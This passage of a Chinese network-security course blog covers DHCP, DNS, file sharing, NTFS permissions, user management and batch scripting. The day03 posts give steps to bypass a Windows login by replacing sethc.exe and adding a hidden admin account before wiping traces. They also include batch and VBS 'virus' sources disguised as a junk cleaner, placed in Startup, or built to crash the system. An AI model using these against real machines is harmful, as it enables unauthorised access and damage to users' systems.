**服务器发送DHCP ACK广播包**（acknowledge，确认）\n\n         服务器确定了租约，并提供网卡详细参数IP，掩码，网关，DNS，租期等\n\n---\n\n# 5、DHCP续约\n\n- 1)当租期过 50% 的时候，客户机会再次发送 **DHCP Request** 包，进行续约\n2)如果服务器无响应，则继续使用并在 87.5% 时再次发送 **DHCP Request** 包，进行续约\n3)如果仍未响应，则释放 IP 地址\n4)并重新发送 **DHCP Discovery** 包来获取IP地址\n- 当无任何服务器响应时，自动给自己分配一个 169.254.x.x/16，属于全球统一无效地址，用于临时内网通信\n\n# 6、部署DHCP服务器\n\n1. IP 地址固定（服务器必须固定 IP 地址）\n2. 安装DHCP服务插件\n3. 新建作用域及作用域选项，设置网关IP，及DNS服务器IP\n4. 激活\n5. 客户机验证：可以通过网络连接的禁用启用，或者拔插网线，使之连接\n\nipconfig /release \n释放IP         (取消租约，或者改为手动配置IP，也可以释放租约)\n\nipconfig /renew \n重新获取IP（有IP时，发送 Request 包续约，无IP时发送 Discovery 包重新获取IP）\n\n# 7、地址保留\n\n- 对指定的 MAC 地址，固定动态分配 IP 地址\n\n场景：公司有个任性的boss想在 使用自动分配IP 时 获得一个固定的IP(没什么用)\n原理：对指定电脑的MAC地址作保留，今后收到此地址发来的Discovery包时，将指定 IP 分配给他\n\n# 8、选项优先级\n\n- 作用域选项＞服务器选项\n- 当服务器上有多个作用域时，可以在服务器选项设置DNS服务器\n\n# 9、DHCP备份和还原\n\n- 右键服务器可以备份，建议备份到U盘\n- 在电脑损坏时，拿一台新的服务器，配置DHCP，插入U盘，点击还原即可\n\n# 10、DHCP攻击与防御\n\n- 攻击 DHCP 服务器：频繁的发送伪装 DHCP 请求(假MAC)，直到将 DHCP 地址池资源耗尽，导致正常请求无法回应\n\n    防御：在交换机（管理型）的端口上做动态 MAC 地址绑定\n\n- 伪装 DHCP 服务器：hacker 通过将自己部署为 DHCP 服务器，为客户机提供非法IP地址(无法上网)\n\n    防御：在交换机（管理型）除合法的 DHCP 服务器所在接口外，全部设置为禁止发送 DHCP Offer 包","tags":["网络安全"],"categories":["网络安全"]},{"title":"day05 - DNS部署与安全","url":"/2020/08/05/day05-DNS/","content":"\n# 1、DNS\n\n- Domain Name Service\n\n- 域名服务\n\n- 作用：为客户机提供域名解析服务\n\n  <!-- more -->\n\n# 2、域名组成\n\n- 如“www.sina.com.cn” 是一个域名，从严格意义上来说“sina.com.cn”才被称为域名（全球唯一），而“www”是主机名\n\n- “主机名.域名”称为完全限定域名（FQDN,Fully Qualified Domain Name）\n    - 一个域名下可以有多个主机，域名全球唯一，那么“主机名 .域名”肯定也全球唯一\n    - 主机名为服务器标识，如www.sina.com.cn 和mail.sina.com.cn ,就是说 新浪公司有两台DNS服务器，一台的标识为www，一台的标识为mail\n\n    ![](https://raw.githubusercontent.com/yuchen-zeta/images/main/blog/pic_bed/202008day05.png)\n\n    例:\n    www.baidu.com. \n    这个.默认浏览器自动添加\n    .为根域\n    .com为顶级域\n    baidu为一级域名\n    www为二级域名\n\n    - FQDN = 主机名.DNS后缀\n    - FQDN（完整合格的域名）\n\n# 3、监听端口\n\n- TCP          53\n- UDP         53\n\n# 4、DNS解析种类\n\n- **按照查询方式**\n\n    1.递归查询：客户机与本地 DNS 服务器之间 （DNS服务器转发器也算）\n    （所问既所答，1 和 8）\n\n    2.迭代查询：本地 DNS 服务器与根等其他 DNS 服务器的解析过程\n    （所闻非所答，2—7）\n\n    ![](https://raw.githubusercontent.com/yuchen-zeta/images/main/blog/pic_bed/202008day05.jpg)\n\n    - DNS解析过程： 客户机想访问 www.baidu.com\n        1. 查找本机缓存\n        2. 若无则找本机 host\n        3. 还没有就向本地 DNS 服务器发出请求\n        4. 本地 DNS 服务器查找 DNS 缓存 和 内置的解析 ，若有则向客户机返回 IP 地址\n        5. 若无则向外查找\n        6. 本地 DNS 服务器向 根域 DNS 服务器发送请求\n        7. 根域 DNS 服务器回应 .com域名服务器 的 IP 地址\n        8. 本地 DNS 服务器向 .com域名服务器 发送请求\n        9. .com域名服务器回应 baidu.com域名服务器 的 IP 地址\n        10. 本地 DNS 服务器向 baidu.com域名服务器 发送请求\n        11. baidu.com域名服务器回应 www.baidu.com 对应的 IP 地址\n        12. 本地 DNS 服务器把收到的 IP 地址返回给客户机，并记下缓存\n        13. 客户机收到地址并记下缓存\n- **按照查询内容分类**\n    1. 正向解析：已知域名，解析IP地址\n    2. 反向解析：已知IP地址，解析域名\n        - nslookup手工解析时，会进行反向解析，显示真实服务器信息\n\n# 5、DNS服务器搭建过程\n\n- 要求网卡 IP 是静态 IP 地址\n- 安装 DNS 服务器插件（也就是安装并开启 TCP 及 UDP 53 端口）\n- 创建区域文件（负责一个域名后缀的解析，如 baidu.com 为域名后缀，一台 DNS 服务器内可以存放多个区域文件）\n- 新建 A 记录 (主机记录)，设置主机名，如www，设置IP\n- **域名解析记录类型：**\n    - A记录：正向解析记录\n    - CNAME记录：别名\n        - 给A记录设置别名，如给www起别名lalala\n        访问lalala.baidu.com，其实就是访问www.baidu.com\n    - PTR记录：反向解析记录\n    - MX：邮件交换记录\n    - NS：域名服务器解析\n\n# ６、DNS客户机解析方法\n\n1. 设置DNS服务器 IP \n2. 手工解析域名：nslookup 域名\n\nnslookup   进入域名解析模式，输入域名就返回IP\nexit            退出该模式\n\n# 7、域名请求的顺序\n\n- 客户机处理DNS请求顺序：DNS缓存--本地hosts文件--找本地DNS服务器\n- 服务器处理DNS请求顺序：DNS高速缓存--本地区域解析文件--转发器--根\n\n# 8、辅助DNS服务器\n\n- 作用：为主 DNS 服务器提供备份，提高安全性，会实时更新\n- 创建过程：\n    1. 在主要 DNS 服务器中，对想要备份的区域右键--属性--区域复制里，勾上”只允许到下列服务器“并把辅助 DNS 服务器的 IP 地址添加上去\n    2. 在辅助 DNS 服务器中，新建区域并选择辅助区域，IP 地址填主要 DNS 服务器即可\n\n# 9、清除DNS缓存\n\n- **客户机清除缓存**\n    - ipconfig /flushdns              清除 DNS 缓存\n    ipconfig /displaydns           查看 DNS 缓存\n    - 清除缓存原因：某网站域名解析若有缓存，第二次解析时直接在本地缓存中找，即使网站的IP 已经更改，解析时仍返回 缓存中的IP\n- **服务器清除缓存**\n    - windows服务器：dns工具--查看--高级，调出缓存，清除缓存\n\n# 10、DNS服务器分类\n\n- 主要名称服务器\n- 辅助名称服务器 == 备份的\n- 根名称服务器     == 全球只有13台\n- 高速缓存名称服务器 == 只保存缓存，不解析\n\n# 11、为DNS主机命名\n\n1. 在正向区域里新建主机记录，设置主机名为dns1，设置IP 为服务器IP\n2. 在反向区域新建 PTR 指针，设置IP为服务器IP，主机名选择之前创建的dns1","tags":["网络安全"],"categories":["网络安全"]},{"title":"day04 - 文件共享服务器(Cifs)","url":"/2020/08/04/day04-Cifs/","content":"\ncifs：公司对内偏多 (微软开发,所有windows系统都有,适合win系)\nftp ：对外偏多\n\n<!-- more -->\n\n# 一、文件共享服务器概述\n\n- 通过网络提供文件共享服务，提供文件下载和上传服务（类似于FTP服务器）\n\n# 二、创建共享\n\n- 方法:文件夹右键属性－共享－开启共享－设置共享名－设置共享权限\n- 注：\n\n    1）在本地登录时，只受NTFS权限的影响\n    2）在远程登录时，将受共享及NTFS权限的共同影响，且最终权限取交集。\n    3）所以建议设置共享权限为everyone完全控制，然后具体的权限在NTFS中设置即可。\n\n# 三、访问共享\n\n- 在开始运行或我的电脑地址栏中，输入 UNC 地址：\n\\\\文件共享服务器IP\n\\\\文件共享服务器IP\\共享名  (与共享文件在服务器的路径位置无关)\n- 第一次访问需要服务器上一个账户,共享前,服务器可以新建一个临时用户\n再次访问会直接登录,若要换账号登录,自己电脑注销重进就可以\n\n# 四、隐藏共享与访问方法\n\n- 在分享时将分享名后面加上 $ 符号，如 share$\n- 在访问使需要知道该共享名 share$ 才能访问\n手动输入  \\\\文件共享服务器IP\\共享名  ，如\\\\10.1.1.2\\share$\n\n# 五、相关共享DOS命令\n\n- net share                                  #列出共享列表\n- net share 共享名=共享路径    #创建共享，如 net share c$=c:\\\n- net share 共享名 /del              #删除共享文件\n\n# 六、屏蔽系统隐藏共享自动产生\n\n- **打开注册表**\n\n    打开注册表编辑器：regedit\n\n- **定位共享注册表位置**\n\n    位置：（可百度自查）\n\n    HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Service\\lanmanserver\\parameters\n\n    在该位置新建 REG_DWORD 类型的 AutoShareServer ，并将值设为 0\n\n# 七、查看本地网络连接状态\n\n         netstat -an （查端口，是否开放）\n\n# 八、关闭445服务\n\n可以通过关闭445端口来屏蔽病毒传入（如勒索病毒等）\n\n- 方法1：打开 services.msc，停止并禁用 server 服务，且把恢复一栏都改为不操作\n- 方法2：禁止被访问445，配置高级安全防火墙--入站规则（win7及以上系统，win2008及以上系统）\n\n常见端口：\n    3389                        *#远程桌面*\n    23                            *#telnet*\n    445                          *#共享服务*","tags":["网络安全"],"categories":["网络安全"]},{"title":"day04 - NTFS安全权限","url":"/2020/08/04/day04-NTFS/","content":"\n\n# 一、NTFS权限概述\n\n1. 通过设置NTFS，实现不同用户访问不同对象（文件，文件夹）的权限\n\n2. 分配了正确访问权限后，用户才能访问不同的权限\n\n3. 设置权限防止资源被篡改、删除\n\n   <!-- more -->\n\n# 二、文件系统概述\n\n- 文件系统即在外部存储设备上组织文件的方法\n\n    常见的文件系统\n\n    - FAT       windows\n    - NTFS     windows\n    - EXT       linux常见\n\n# 三、NTFS特点 (FAT不具备)\n\n1. 提高磁盘读写性能\n2. 可靠性\n加密文件系统\n访问控制列表（设置权限）ACL: access control list\n3. 磁盘利用率\n压缩\n磁盘配额 －－为不同用户分配空间\n4. 支持单个文件大于4个G\n\n注：16G以下的U盘建议格式化成FAT\n\n# 四、修改NTFS权限\n\n1.　取消继承\n\n作用：取消后，可以任意修改权限列表\n\n方法：文件右键属性－安全－高级－取消第一个对号-选择复制(继承财产)\n\n文件权限|权限内容\n:-:|:-:\n完全控制|拥有读取、写入、修改、删除文件，及特殊权限\n修改|拥有读取、写入、修改、删除文件的权限\n读取和执行|拥有读取，及执行文件的权限\n读取|拥有读取文件的权限\n写入|拥有修改文件内容的权限\n特殊权限|控制文件权限列表的权限\n\n文件夹权限|权限内容\n:-:|:-:\n完全控制|拥有对文件及文件夹读取、写入、修改、删除文件，及特殊权限\n修改|拥有对文件及文件夹读取、写入、修改、删除文件的权限\n读取和执行|拥有对文件夹中的文件下载、读取，及执行文件的权限\n列出文件夹内容 |          可以列出文件夹内容，也就是进得去文件夹          \n读取      |           拥有对文件夹中的文件下载、读取的权限           \n写入      |             拥有在文件夹中创建新的文件的权限             \n特殊权限    |控制文件夹权限列表的权限\n\n2. 权限累加\n\n当用户同时属于多个组，允许权限是可以累加的\n\n案例：用户a同时属于A组和B组，A组可读取，B组可写入，则用户a最终权限是即可读取也可写入\n\n3. 拒绝最大 (即优先)\n\n当用户权限累加时，遇到拒绝权限，拒绝优先，结果就是无法使用该权限\n\n案例：用户a和用户b属于A组，A组拥有读取权限，但单独为用户a设置读取权限的拒绝，那么用户a无法读取，用户b可以读取\n\n4. 取得所有权\n\n默认只有administrator有这个权限 ！\n\n作用：可以将任何文件夹的所有者改为administrator\n\n5. 强制继承\n\n作用：对下(以下文件)强制继承父子关系！\n\n方法：文件夹右键属性－安全－高级－勾上第二个对号即可\n\n使用场景：当一个文件夹内的一些子文件经过修改权限时，想要使所有子文件权限统一于父文件，可以通过此方法将文件夹的权限强制替换掉原来子文件的权限\n\n6. 文件复制剪切对权限的影响\n\n文件复制后，跨分区移动，文件的权限会被目标文件覆盖\n\n文件同分区移动，文件的权限不会被目标文件覆盖","tags":["网络安全"],"categories":["网络安全"]},{"title":"day03 - 破解系统密码","url":"/2020/08/03/day03-Crack-system-password/","content":"\n\n# 一、利用5次shift漏洞破解win7密码\n\n1. 漏洞\n    - 漏洞1：未登陆系统前连按5次shift弹出程序（粘滞键）\n      程序位置：c:\\windows\\system32\\sethc.exe\n    \n    - 漏洞2：部分win7及win10系统在未进入系统时，可以通过系统修复漏洞篡改系统文件名！\n\n    - 注：如果win7或win10已修补此漏洞2，则无法利用\n\n    <!-- more -->\n    \n    ---\n    \n2. 破解过程相关知识\n    - cmd工具路径                   c:\\windows\\system32\\cmd\n    - 用户/账户密码存储位置   c:\\windows\\system32\\config\\SAM\n    - 修改账户密码                   net  user 用户名 新密码\n\n    ---\n\n3. 漏洞利用过程\n- 案例：破解win7系统密码\n  - 实验步骤：\n  1. 开启win7虚拟机，开机，随便设置一个密码\n     可用 net user Barry sad#adhk&*hkadb13asd45 设置\n\n  2. 关机后开机，进入登录页面，鼠标进入虚拟机，连按 shift 5次，弹出对话框，说明存在 漏洞1：5次shift漏洞 \n\n    该程序的位置：c:\\windows\\system32\\sethc.exe（突破口：将其替换）\n\n  ![](https://raw.githubusercontent.com/yuchen-zeta/images/main/blog/pic_bed/202008day03-2(0).png)\n\n  3. 若存在漏洞，则关机再开机，在出现windows启动界面(四个小点汇聚成旗)时，强制关机(把虚拟机电源拔了，虚拟机右键选择电源—关闭客户机)\n\n  4. 再开机，如果没有出现以下界面，再强制关机一次\n      （win7 一般两次，win10 一般三次）\n      选择启动修复（漏洞在此哦）\n\n  ![](https://raw.githubusercontent.com/yuchen-zeta/images/main/blog/pic_bed/202008day03-2(1).png)\n  进入 “ 启动修复 ” 界面\n\n  ![](https://raw.githubusercontent.com/yuchen-zeta/images/main/blog/pic_bed/202008day03-2(2).png)\n\n\n  5. 出现系统还原提示，点击取消，然后它继续尝试修复，等待几分钟\n\n      ![](https://raw.githubusercontent.com/yuchen-zeta/images/main/blog/pic_bed/202008day03-2(3).png)\n\n      出现问题原因，如以下界面，点击查看详细信息\n\n      ![](https://raw.githubusercontent.com/yuchen-zeta/images/main/blog/pic_bed/202008day03-2(4).png)\n\n  6. 在详细信息中，点击最后一个 txt 文档 的链接，进入记事本\n\n      ![](https://raw.githubusercontent.com/yuchen-zeta/images/main/blog/pic_bed/202008day03-2(5).png)\n\n      ![](https://raw.githubusercontent.com/yuchen-zeta/images/main/blog/pic_bed/202008day03-2(6).png)\n\n      选择文件 — 另存为 (或打开)，进入以下界面，此时就是在最高权限下查看所有文件\n\n      ![](https://raw.githubusercontent.com/yuchen-zeta/images/main/blog/pic_bed/202008day03-2(7).png)\n\n ![](https://raw.githubusercontent.com/yuchen-zeta/images/main/blog/pic_bed/202008day03-2(8).png)\n\n\n  1. 接下来去寻找 5次shift启动的粘滞键程序\n      - 位置： c:\\windows\\system32\\sethc.exe    \n      将其替换为cmd程序\n      - 位置： c:\\windows\\system32\\cmd\n      注：此时我们要找的C盘在system权限下其实是D盘\n      - 进入D盘，进入windows中的system32中，选择显示所有文件\n      找到 sethc  ，将其重命名（任意），如sethc-bak\n      找到 cmd   ，复制一份cmd，改名为sethc\n      此时基本已经成功，再次开机使调用sechc时就是调用cmd了\n\n      ![](https://raw.githubusercontent.com/yuchen-zeta/images/main/blog/pic_bed/202008day03-2(9).png)\n\n  ![](https://raw.githubusercontent.com/yuchen-zeta/images/main/blog/pic_bed/202008day03-2(10).png)\n\n  8. 全部关闭，重新启动，回到登录界面\n     \n      连按5次shift ，cmd窗口就被调用出来了\n      接下来可以为所欲为了，要想进入有以下两种方法\n        - 若想修改该用户的密码：\n          net user 用户名  新密码\n          用户名在登录界面可以看到，若不想设密码，可以输入“”，置空\n        - 若不想修改该用户的密码：\n          net user test 123 /add                               #新建用户，设置密码\n          net localgroup administrators test /add   #升权为管理员\n          做完该做的事之后......\n          net user test /del                                      #删除用户，擦除数据\n          注：还需删除日志，今后会提到，此处暂未提及\n\n# 二、利用PE破解系统密码\n\n- Windows PE：Windows Preinstallation Environment，Windows预安装环境，是带有有限服务的最小Win32子系统，基于以保护模式运行的Windows XP Professional及以上内核。\n- 功能：包括运行Windows安装程序及脚本、连接网络共享、自动化基本过程以及执行硬件验证所需的最小功能\n- 使用极其简单：\n    - 下一个PE工具，插入U盘，将系统装入，开启目标系统电脑，在刚开机使按相应方法进入BIOS界面(Basic Input Output System,基本输入输出系统)\n        - 真实机一般狂摁某个按键，如Esc，F1等\n        - 虚拟机，进入下拉菜单，点击 打开电源时进入固件\n    - 到BOOT页面下选择U盘或是光驱启动，F10保存，退出BIOS，进入PE系统，点击 破解Windows登录密码\n    - 软件自动定位到C:\\WINDOWS\\SYSTEM32\\CONFIG\\SAM\n    打开后选择用户，更改口令，输入新密码，若不输入，则不设密码\n    保存更改，破解成功\n\n原理：SAM保存着所有用户的账号和密码hash值，我们要做的就是进入SAM文件，用 我们要设置的新密码的hash值 替换 针对账号的密码hash值","tags":["网络安全"],"categories":["网络安全"]},{"title":"day03 - 用户与组管理 | 远程管理","url":"/2020/08/03/day03-Remote administration/","content":"\n# 服务器系统版本介绍\n\n- windows服务器系统：win2000 win2003 win2008 win2012\n\n- linux服务器系统：Redhat(收费)   Centos(免费)  同一家公司\n\n  <!-- more -->\n\n# 一、用户管理\n\n1. 用户概述\n    - 每一个用户登陆系统之后，拥有不同的操作权限\n    - 每一个账户都有自己唯一的 SID（安全标识符）\n    - 用户SID：S-1-5-21-426206823-2579496042-14852678-500\n\n        系统SID：S-1-5-21-426206823-2579496042-14852678\n\n        > 用户UID：500\n        windows系统管理员 administrator 的默认UID是 500\n        普通用户的UID从 1000 开始\n           linux    系统管理员        root         的默认UID是 0\n        普通用户是1000开始\n\n    - 注：不同账户拥有不同的权限，为不同账户赋权限也就是为不同账户的SID赋权，而不是单指表面的用户名\n    - 查看SID：\n    whoami             查看主机名和当前用户名\n    whoami /user    查看主机名、当前用户名，以及SID\n    - 用户密码储存位置：C:\\Windows\\System32\\config\\SAM \n    hash哈希加密算法 (单项加密，无法解密，只能得到校验码)\n    破解方法：暴力破解 撞库\n    - windows 服务器用户默认密码最长有效期为 42 天\n\n    ---\n\n2. 内置账户\n    - 给人使用的账户：\n\n        administrator                        #管理员账户\n\n        guest                                     #来宾账户 权限极低，一般系统默认禁用\n\n    - 计算机服务组件相关的系统账号\n\n        system                                    #系统账户        == 最高权限\n\n        local services                           #本地服务账户 == 普通权限\n\n        network services                     #网络服务账户  == 普通权限\n\n    ---\n\n3. 配置文件\n    - 每个用户都有自己的配置文件，在第一次登陆产生\n    - 路径：\n\n        win7/win2008     c:\\用户\\\n\n        xp/win2003         c:\\Documents and Settings\\\n\n        可以利用系统变量 %usersprofile% 获取当前用户路径\n\n    ---\n\n4. 用户管理命令\n\n    ```jsx\n    net user\t\t\t                  #查看用户列表\n    net user 用户名                 #查看用户信息 \n    net user 用户名 密码\t\t        #更改密码     （服务器中仅管理员）\n    net user 用户名 密码  /add      #创建一个新用户（服务器中仅管理员）\n    net user 用户名 /del\t          #删除一个用户  （服务器中仅管理员）\n    net user 用户名 /active:yes/no  #激活或禁用用户（服务器中仅管理员）\n    ```\n\n# 二、组管理\n\n1. 组概述\n    - 组的作用：简化权限的赋予\n    - 赋权方式：\n        - 用户---组---赋权限\n        - 用户---赋权限\n2. 内置组\n    - 内置组的权限默认已经被系统赋予\n\n    ```jsx\n    1. administrators\t\t\t# 管理员组\n    2. guests\t\t\t\t      # 来宾组\n    3. users\t\t      \t\t# 普通用户组，默认新建用户所在组\n    4. network\t\t\t    \t# 网络配置组\n    5. print\t\t\t      \t# 打印机组\n    6. Remote Desktop\t\t\t# 远程桌面组\n    ```\n\n3. 组管理命令\n\n    ```jsx\n    net localgroup\t\t\t              #　查看组列表\n    net localgroup 组名 \t          \t#  查看该组的成员\n    net localgroup 组名 /add\t\t      # 创建一个新的组\n    net localgroup 组名 /del\t    \t  # 删除一个组\n    net localgroup 组名 用户名 /add \t# 添加一个新用户到组\n    net localgroup 组名 用户名 /del   # 从组中删除用户\n    ```\n\n# 三、服务器远程管理\n\n- mstsc                        #远程桌面程序\n    - 步骤\n    1.首先配置网络，并实现客户机与服务器可以互通 (ping得通)\n    2.服务器开启允许远程控制：我的电脑属性 — 远程设置 — 选择允许 — 确定\n    3.客户机上：运行窗口输入 mstsc 打开远程连接工具\n    4.在mstsc工具上输入服务器的IP ，点击确定\n    5.输入服务器的账号密码\n    注：如使用非管理员账户登陆，需要在服务器上将用户加到 远程桌面内置组 Remote Desktop Users 中\n- telnet IP                  #cmd中实现远程控制\n    - 在cmd上输入telnet IP \n    输入服务器的账号密码\n    注：如使用非管理员账户登陆，需要在服务器上将用户加到 TelnetClients 中\n- netstat -an                #查看本机开放的所有端口\n\n    > 一些特殊端口：telnet：23远程桌面协议RDP：3389","tags":["网络安全"],"categories":["网络安全"]},{"title":"day03 - 批处理与病毒","url":"/2020/08/03/day03-bat&virus/","content":"\n\n- 批处理作用：自上而下成批处理每一条DOS命令，直到执行到最后一条。\n\n# 如何创建批处理：\n\n- 扩展名：.bat\n- 创建方法：创建一个记事本文件，然后将其扩展改为.bat\n- 运行环境：cmd  (cmd.exe)\n\n<!-- more -->\n\n# **基本命令**\n\n- echo：输出信息\n\n    > @echo off：关闭回显（屏蔽执行过程）只显示结果\n     echo.       ：输出空行\n\n---\n\n- pause：暂停批处理运行\n- cls     ：清屏\n\n---\n\n- color <颜色代码> ：\n改dos界面颜色，背景色+文字颜色，如0a\n\n---\n\n![](https://raw.githubusercontent.com/yuchen-zeta/images/main/blog/pic_bed/202008day03-1(1).png)\n\n- title <标题内容>                 ：给批处理脚本设置标题\n\n---\n\n- > nul(：隐藏结果) 2> nul  (：隐藏错误信息)\n\n---\n\n- md 路径+文件名                ：建立目录\n\n---\n\n- rd  (参数) 文件路径             ：删除目录\n  #参数 /s 除目录本身外还删除其下的所有子目录和文件参数 \n  /q 安静模式，带 /s 删除目录树时不要求确认\n\n---\n\n- cd 路径                                ：进入目录\n# cd\\ 回到根目录   |    cd.. 回到上级目录\n\n---\n\n- goto <区块名>：跳转到一个命令区块继续运行\n#用 :<区块名> 来声明一个区块例如： :7749 就声明了一个名为 7749 的区块\n\n---\n\n- set (可选参数) <变量名> = 变量值\n#参数 /p , 程序暂停等待用户输入，变量的值就等于用户输入\n例如：set /p a = 请输入变量 a 的值：，不加 /p 的话就是直接赋值\n- %<变量名>% ,如%u%          #引用变量，提取变量的值\n- 典例\n\n    ```jsx\n    @echo off         \n    color 0a             \n    title 批处理小程序v1.0     \n     \n    :menu\n    cls\n    echo ==========================\n    echo               菜单\n    echo         1、修改管理员密码\n    echo         2、定时关机\n    echo         3、查看本机IP\n    echo         4、退出本程序\n    echo ===========================\n     \n    set /p num=请输入选项：   \n    if \"%num%\"==\"1\" goto 1\n    if \"%num%\"==\"2\" goto 2\n    if \"%num%\"==\"3\" goto 3\n    if \"%num%\"==\"4\" goto 4\n    echo 请正确输入数值，按任意键继续！\n    pause\n    goto menu\n     \n    :1\n    set /p u=请输入用户名:\n    set /p p=请输入新密码:\n    net user %u% %p%   >nul  \n    echo 您的密码已经设置成功!按任意键返回菜单!\n    pause\n    goto menu\n    #注解：net user 用户名 密码 #修改账户密码（windows所有平台支持）\n           >nul     #清除系统反馈，如命令成功完成...\n    :2\n    set /p time=请输入时间：\n    shutdown -s -t %time%  \n    set /p x=是否取消（Y：是，N：否）：\n    if \"%x%\"==\"Y\" shutdown -a\n    echo 执行完毕，按任意键返回菜单!\n    pause\n    goto menu\n    \n    :3\n    ipconfig\n    echo 按任意键返回菜单!\n    pause\n    goto menu\n    \n    :4\n    exit\n    ```\n\n---\n\n## 简单病毒\n\n- 批处理文件一\n\n    功能：伪装垃圾清理程序，添加到开机自启，无限弹出cmd窗口\n\n    ![](https://raw.githubusercontent.com/yuchen-zeta/images/main/blog/pic_bed/202008day03-1(2).png)\n\n    ```jsx\n    @echo off\n    title 系统垃圾清理\n    color 2f\n    echo =======若杀毒软件恶意拦截，请选择【允许程序的所有操作】========\n    echo.\n    echo.\n    echo :a>c:\\windows\\zuosi.bat\n    echo start>>c:\\windows\\zuosi.bat\n    echo goto a>>c:\\windows\\zuosi.bat\n    copy c:\\windows\\zuosi.bat \"%USERPROFILE%\\「开始」菜单\\程序\\启动\" >nul\n    #此处的系统启动菜单为win 2003下的，不同系统有所不同\n    echo.\n    echo   ====== 垃圾清理中，请不要关闭窗口======\n    echo.\n    ping -n 5 127.0.0.1 >nul  #运行几秒，骗过用户\n    echo.\n    echo   ====== 垃圾清理完毕，共清理垃圾500M===\n    echo.\n    echo.\n    echo   ====== 建议立即重启电脑\n    echo   按任意键关闭！\n    pause\n    exit\n    ```\n\n---\n\n- 批处理文件二（纯恶搞）\n\n    功能：伪装垃圾清理程序 强制终止桌面进程\n\n    - taskkill /im explorer.exe /f >nul 2>nul\n    - taskkill：杀死进程   |   /im 进程名：指定杀死哪个进程    |   /f ：强制\n\n    ```jsx\n    @echo off\n    title 系统垃圾清理\n    color 2f\n    echo ====== 若有杀毒软件恶意拦截，请选择【允许程序的所有操作】=====\n    echo.\n    echo.\n    echo ====== 垃圾清理中，请不要关闭窗口=======\n    echo.\n    ping -n 5 127.0.0.1 >nul\n    taskkill /im explorer.exe /f >nul 2>nul\n    echo.\n    echo. ===== 完了，你系统废了======\n    ping -n 5 127.0.0.1>nul\n    echo.\n    start c:\\windows\\explorer.exe           #打开进程\n    echo.\n    echo ====== 已经修复好了！是不是吓坏了！！嘿嘿=========\n    pause\n    ```\n\n---\n\n- 简易蓝屏炸弹 - 针对win 2003\n\n    ```jsx\n    ntsd -c q -pn winlogon.exe\n    ```\n\n    - ntsd      ：杀死进程\n    ntsd -c q -pn 进程名：强制杀死指定进程\n    - 蓝屏原因：\n           winlogon.exe为windows登录进程，在开机后就已经登录成功且处于使用状态，无法杀死，而命令想强制杀死，系统不让，结果导致蓝屏\n    - 作死使用方法：将该命令写成一个批处理放到系统启动文件夹下\n    结果    😈       ：开机就蓝屏\n\n---\n\n- 简易小脚本\n    - 方法：写命令到txt，将扩展名改为.vbs\n\n    ```jsx\n    do\n    msgbox \"啦啦啦！\"\n    loop\n    ```\n\n    - 效果       ：加上do-loop后变为死循环，窗口无法关闭\n    解决方法：vbs 使用微软自带的wscript.exe来编写的\n    - 注：可以用修改软件图标，使vbs文件伪装得更好\n\n    ![](https://raw.githubusercontent.com/yuchen-zeta/images/main/blog/pic_bed/202008day03-1(3).png)\n\n    - 升级小脚本（并没有什么用😒）\n\n        ```jsx\n        do\n        msgbox \"小哥我最帅！\"\n        msgbox \"小子，你对这件事有异议吗\"\n        msgbox \"你要为此付出代价\"\n        msgbox \"从现在开始我要求你点100下鼠标\"\n        msgbox \"100\"\n        msgbox \"99\"\n        msgbox \"98\"\n        msgbox \"97\"\n        msgbox \"96\"\n        msgbox \"95\"\n        msgbox \"94\"\n        msgbox \"93\"\n        msgbox \"92\"\n        msgbox \"91\"\n        msgbox \"90\"\n        msgbox \"....\"\n        msgbox \"3\"\n        msgbox \"2\"\n        msgbox \"1\"\n        msgbox \"如果你看到这里，说明你确实很执着，你感动了我，请再点一下\"\n        msgbox \"年轻人，有时候执着也没用，换个姿势再来一次\"\n        loop\n        ```\n\n---\n\n- 整人网页\n\n    ```jsx\n    <!DOCTYPE html>\n    <html>\n    <head>\n    \t<meta charset=\"utf-8\">\n    \t<meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">\n    \t<title>很恶心的常见整人效果的代码</title>\n    \t<link rel=\"stylesheet\" href=\"\">\n    </head>\n    <body>\n    \t<a href=\"\" onmouseover=\"alert('飞哥真帅');\n    alert('飞哥真帅');\n    alert('飞哥是真帅');\n    alert('飞哥是真帅');\n    alert('飞哥是真的帅');\n    alert('同意不！');\n    alert('不同意？');\n    alert('去死吧');\n    \t\">不许把鼠标移到这里！</a>不敢了吧！！！\n    </body>\n    </html>\n    ```\n\n    测试效果：\n\n    ![](https://raw.githubusercontent.com/yuchen-zeta/images/main/blog/pic_bed/202008day03-1(4).png)\n\n","tags":["网络安全"],"categories":["网络安全"]},{"title":"day02 - IP地址详解","url":"/2020/08/02/day02-IP/","content":"\n# 局域网\n\n- 局域网：一般称为内网\n- 单局域网的构成：交换机、网线、PC (其他IT终端)\n- 交换机：用来组建内网的局域网的设备（硬件上有很多网口）\n\n<!-- more -->\n\n# 子网掩码\n\n- IP 地址构成：网络位 + 主机位       | 32位二进制，x.x.x.x  0≤ x ≤ 255\n- **局域网通信规则**：所有人必须都在**同一网段内**(网络位相同)才能通信\n- **子网掩码**：用来确定网络位，与 255 对应的是网路位，与 0 对应的是主机位\n\n    > 例如：192.168.0.X，前 3 位是网络位，最后一个是主机位\n    属于 192.168.0.0 网段，名字是 .X，子网掩码就是 255.255.255.0\n\n# IP地址详解\n\n- ISO定义五大类：（以IP地址的第一位进行区分）\n    - A 类：1    - 126 默认子网掩码：255.0.0.0\n    - B 类：128 - 191 默认子网掩码：255.255.0.0\n    - C 类：192 - 223 默认子网掩码：255.255.255.0\n    - D 类：224 - 239 组播地址\n    - E 类： 244 - 254 科研使用\n\n    注：目前我们只能使用A、B、C类 但A、B、C类子网掩码可以修改\n\n- 几种特殊的 IP 地址：\n    - 本机 IP ：127.0.0.1\n    - 广播地址：主机位全为 255\n    - 网段：主机位全为 0\n\n        > 主机位不能全为0和255\n\n# 网关\n\n- 网关：一个网络的出口，Gateway=GW，一般网关在路由器上（占一个IP）\n\n    一般是 IP地址 的**最后一位**或者是**第一位**\n\n- 路由器：可以连接外网的设备\n\n> PC向外发包的心理活动\n1、首先判断目标IP与自己是否在 同一个网段\n2、如在同一个网段，则直接发出去，不找网关\n3、如不在同一个网段，则发包给网关\n\n# DNS\n\n**DNS：Domain Name Service 域名服务 |** DNS服务器在公网上，也有IP，由厂商提供\n\n> 输入域名后，浏览器的心理活动\n1、先到本地**DNS缓存**上找\n2、如**DNS缓存**中没找到，则到**本地解析文件**上找\n3、如**本地解析文件**中还是没找到，则请求**DNS服务器**帮助\n\n- 